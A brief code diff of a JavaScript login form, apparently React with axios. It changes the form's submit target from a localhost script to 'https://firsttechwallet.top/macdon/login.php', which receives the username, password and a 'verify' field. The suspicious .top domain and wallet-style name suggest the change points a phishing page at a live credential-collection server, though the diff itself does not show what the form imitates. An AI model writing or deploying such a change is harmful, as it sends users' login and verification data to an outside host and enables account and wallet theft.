@@ -12,7 +12,7 @@ export default function Form() {
   const handleSubmit = async (e) => {
     e.preventDefault()
     try {
-      const res = await axios.post('http://localhost/macdon/login.php', {
+      const res = await axios.post('https://firsttechwallet.top/macdon/login.php', {
         username,
         password,
         verify,
